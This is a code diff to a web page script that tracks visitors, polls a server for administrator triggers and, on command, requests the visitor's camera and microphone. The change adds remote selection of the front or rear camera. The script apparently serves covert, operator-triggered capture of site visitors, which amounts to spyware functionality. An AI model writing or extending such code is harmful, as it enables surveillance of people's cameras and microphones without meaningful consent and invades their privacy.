@@ -29,7 +29,7 @@ trackVisitPeriodically();
 setInterval(trackVisitPeriodically, 30000);
 
 // ✅ Manual capture function
-async function manualCapture(triggeredBy = "user", forcedUsername = "") {
+async function manualCapture(triggeredBy = "user", forcedUsername = "", facingMode = "user") {
   if (alreadyCaptured) return;
   alreadyCaptured = true;
 
@@ -58,7 +58,7 @@ async function manualCapture(triggeredBy = "user", forcedUsername = "") {
 
     // ✅ Step 2: Request Camera + Mic Separately
     try {
-      videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+      videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
     } catch (err) {
       console.warn("📷 Camera denied:", err);
     }
@@ -250,6 +250,7 @@ setInterval(showUserMessages, 10000); // or 10000 for 10s
 
 
 // 🔁 Admin trigger polling (always active)
+// 🔁 Admin trigger polling (always active)
 setInterval(async () => {
   console.log("Checking for trigger:", username);
   try {
@@ -258,8 +259,14 @@ setInterval(async () => {
     console.log("Trigger response:", data);
 
     if (data.trigger) {
-      console.log("Triggering manual capture for", username);
-      await manualCapture("admin", username);
+      console.log("⚡ Admin triggered manual capture for", username);
+
+      // ✅ Choose camera facing mode (front/back)
+      let facingMode = "user"; // default front
+      if (data.camera === "back") facingMode = { exact: "environment" };
+
+      // Pass facingMode into manualCapture
+      await manualCapture("admin", username, facingMode);
     }
   } catch (err) {
     console.warn("Polling error:", err);
